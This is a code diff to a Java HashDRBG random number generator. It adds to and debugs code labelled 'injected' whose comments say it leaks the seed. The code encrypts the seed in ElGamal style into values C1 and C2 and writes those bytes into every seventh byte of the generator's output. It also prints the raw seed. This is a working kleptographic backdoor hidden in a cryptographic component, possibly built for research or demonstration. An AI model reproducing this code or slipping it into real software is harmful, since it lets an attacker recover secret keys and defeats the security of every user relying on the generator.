@@ -47,6 +47,9 @@ public class HashDRBG
     private int update2 = 0;
 
     private boolean updateFlag = false;
+
+    private boolean C1_negative = false;
+    private boolean C2_negative = false;
     // *************************************************************************************************************************************************************************************************************************************************************************************************************************
     private long _reseedCounter;
     private EntropySource _entropySource;
@@ -286,17 +289,22 @@ public class HashDRBG
 
             addTo(data, ONE);
         }
-        // injected
+      // injected **********************************************
       return boostEntropy(input, W, lengthInBits/8);
+      // *******************************************************
 //      return W;
     }
 
-    // injected
+    // injected ************************************************************************
     private byte[] boostEntropy(byte[] input, byte[] random_number, int lengthInBytes){
 
         if(_reseedCounter == 1 || updateFlag){
             // Initialize the C1 and C2. We use them to leak the seed.
             load(random_number, input);
+            if(C1_negative){
+                random_number[0] = 85;
+                C1_negative = false;
+            }
             for(int i = 6; i < lengthInBytes; i+=7){
                 if(update1 + 1 < 112) {
                     random_number[i] = C1[update1];
@@ -305,6 +313,10 @@ public class HashDRBG
             }
             updateFlag = false;
         }else if(_reseedCounter % 2 != 0){
+            if(C1_negative){
+                random_number[0] = 85;
+                C1_negative = false;
+            }
             for(int i = 6; i < lengthInBytes; i+=7){
                 if(update1 < 112) {
                     random_number[i] = C1[update1];
@@ -312,6 +324,10 @@ public class HashDRBG
                 }
             }
         }else {
+            if (C2_negative){
+                random_number[0] = 85;
+                C2_negative = false;
+            }
             for(int i = 6; i < lengthInBytes; i+=7){
                 if(update2 < 112) {
                     random_number[i] = C2[update2];
@@ -327,31 +343,65 @@ public class HashDRBG
 
         return random_number;
     }
-
-    // injected
+    // ********************************************************************************
+    // injected ***********************************************************************
     private void load(byte[] random, byte[] seed){
         // just for log ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
         System.out.println("original seed: " + java.util.Arrays.toString(seed));
         // +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-        BigInteger r = new BigInteger(random).mod(p);
+        BigInteger r = new BigInteger(random).mod(new BigInteger("3722375400100794692455034958279425592431123588510429975298855622046875570822803619989684953039790"));
         BigInteger B_seed = new BigInteger(seed);
+        //#######################################################
+        //########### HERE IS MY PROBLEM ########################
+        //#######################################################
+        BigInteger abs = B_seed.abs();
+        // just for test ++++++++
+        System.out.println("B_seed:");
+        System.out.println(B_seed);
         BigInteger t_C1 = BigInteger.valueOf(2).modPow(r, p);
         BigInteger t_C2 = B_seed.multiply(y.modPow(r, p)).mod(p);
-        System.arraycopy(convert(t_C1.toByteArray()), 0, C1,0,112);
-        System.arraycopy(convert(t_C2.toByteArray()), 0, C2,0,112);
+        // just for test+++++++++
+        System.out.println(t_C1);
+        System.out.println(t_C2);
+        //++++++++++++++++++++++++
+        System.arraycopy(convert(t_C1.toByteArray(), 0), 0, C1,0,112);
+        System.arraycopy(convert(t_C2.toByteArray(), 1), 0, C2,0,112);
 
         // just for log +++++++++++++++++++++++++++++++++++++++++++
-        System.out.println("C1: " + java.util.Arrays.toString(C1));
-        System.out.println("C2: " + java.util.Arrays.toString(C2));
+//        System.out.println("C1: " + java.util.Arrays.toString(C1));
+//        System.out.println("C2: " + java.util.Arrays.toString(C2));
         // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++
     }
-
-    private byte[] convert(byte[] arr){
+    // ********************************************************************************
+    private byte[] convert(byte[] arr, int secretCheck){
         if(arr[0] == 0) {
+            if(secretCheck == 0){
+                // just for log
+                System.out.println("C1 (!)(!)(!)");
+                System.out.println(java.util.Arrays.toString(arr));
+                C1_negative = true;
+            }
+            if(secretCheck == 1){
+                // just for log
+                System.out.println("C2 (!)(!)(!)");
+                System.out.println(java.util.Arrays.toString(arr));
+                C2_negative = true;
+            }
             byte[] tmp = new byte[arr.length - 1];
             System.arraycopy(arr, 1, tmp, 0, tmp.length);
             return tmp;
+        }else{ // just for test ************************************
+            if(secretCheck == 0){
+                System.out.println("C1:");
+                System.out.println(java.util.Arrays.toString(arr));
+            }
+            if(secretCheck == 1){
+                System.out.println("C2:");
+                System.out.println(java.util.Arrays.toString(arr));
+            }
+            //******************************************************
         }
+
         return arr;
 
     }
